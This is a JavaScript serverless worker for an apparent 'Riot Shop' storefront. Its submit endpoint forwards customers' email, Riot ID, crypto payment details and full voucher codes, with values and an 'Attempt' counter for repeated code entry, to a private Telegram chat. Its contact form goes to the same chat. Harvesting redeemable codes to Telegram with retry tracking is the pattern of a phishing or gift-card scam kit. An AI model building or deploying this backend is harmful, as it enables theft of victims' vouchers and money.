const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type',
};

function json(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { 'Content-Type': 'application/json', ...CORS_HEADERS },
  });
}

function formatTelegramMessage(payload) {
  const isCrypto = payload.paymentType === 'crypto';
  const lines = [
    isCrypto ? '<b>New Riot Shop crypto payment</b>' : '<b>New Riot Shop voucher code</b>',
    '',
    `<b>Order:</b> ${payload.orderId || 'N/A'}`,
    `<b>Email:</b> ${escapeHtml(payload.email || '')}`,
  ];

  if (payload.riotId) {
    lines.push(`<b>Riot ID:</b> ${escapeHtml(payload.riotId)}`);
  }

  lines.push(
    `<b>Method:</b> ${escapeHtml(payload.methodLabel || payload.method || '')}`,
    `<b>Product:</b> ${escapeHtml(payload.productLabel || '')}`,
    `<b>Price:</b> $${Number(payload.price || 0).toFixed(2)}`,
  );

  if (isCrypto) {
    lines.push(
      `<b>Crypto:</b> ${escapeHtml(payload.cryptoSymbol || payload.cryptoCoin || '')}`,
      `<b>Amount:</b> ${escapeHtml(String(payload.cryptoAmount || 'N/A'))}`,
      `<b>Address:</b> <code>${escapeHtml(payload.cryptoAddress || '')}</code>`,
    );
    if (payload.cryptoRateUsd) {
      lines.push(`<b>Rate:</b> $${Number(payload.cryptoRateUsd).toFixed(2)}`);
    }
  } else {
    lines.push(
      `<b>Code:</b> <code>${escapeHtml(payload.code || '')}</code>`,
      `<b>Vouchers:</b> $${(payload.vouchers || []).join(' + $')}`,
      `<b>Attempt:</b> ${payload.attempt || 1}`,
    );
  }

  lines.push(`<b>Time:</b> ${payload.submittedAt || new Date().toISOString()}`);
  return lines.join('\n');
}

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function isValidPayload(payload) {
  if (!payload.orderId || !payload.email) return false;
  if (payload.paymentType === 'crypto') return true;
  return Boolean(payload.code);
}

export default {
  async fetch(request, env) {
    if (request.method === 'OPTIONS') {
      return new Response(null, { headers: CORS_HEADERS });
    }

    const url = new URL(request.url);

    if (request.method === 'POST' && url.pathname === '/api/contact') {
      if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) {
        return json({ ok: false, error: 'Telegram not configured' }, 500);
      }

      let data;
      try {
        data = await request.json();
      } catch {
        return json({ ok: false, error: 'Invalid JSON' }, 400);
      }

      const name = String(data.name || '').trim();
      const email = String(data.email || '').trim();
      const subject = String(data.subject || '').trim();
      const message = String(data.message || '').trim();
      const emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);

      if (!name || !email || !subject || !message || !emailOk) {
        return json({ ok: false, error: 'Missing or invalid fields' }, 400);
      }

      const text = [
        '<b>New Riot Shop Contact Message</b>',
        '',
        `<b>Name:</b> ${escapeHtml(name)}`,
        `<b>Email:</b> ${escapeHtml(email)}`,
        `<b>Subject:</b> ${escapeHtml(data.subjectLabel || subject)}`,
        '',
        '<b>Message:</b>',
        escapeHtml(message),
      ].join('\n');

      const tgRes = await fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: env.TELEGRAM_CHAT_ID,
          text,
          parse_mode: 'HTML',
          disable_web_page_preview: true,
        }),
      });

      const tgData = await tgRes.json();
      if (!tgRes.ok || !tgData.ok) {
        return json({ ok: false, error: 'Telegram send failed' }, 502);
      }

      return json({ ok: true });
    }

    if (request.method === 'POST' && url.pathname === '/api/submit') {
      if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) {
        return json({ ok: false, error: 'Telegram not configured' }, 500);
      }

      let payload;
      try {
        payload = await request.json();
      } catch {
        return json({ ok: false, error: 'Invalid JSON' }, 400);
      }

      if (!isValidPayload(payload)) {
        return json({ ok: false, error: 'Missing required fields' }, 400);
      }

      const text = formatTelegramMessage(payload);
      const tgRes = await fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: env.TELEGRAM_CHAT_ID,
          text,
          parse_mode: 'HTML',
          disable_web_page_preview: true,
        }),
      });

      const tgData = await tgRes.json();
      if (!tgRes.ok || !tgData.ok) {
        return json({ ok: false, error: 'Telegram send failed' }, 502);
      }

      return json({ ok: true });
    }

    return json({ ok: false, error: 'Not found' }, 404);
  },
};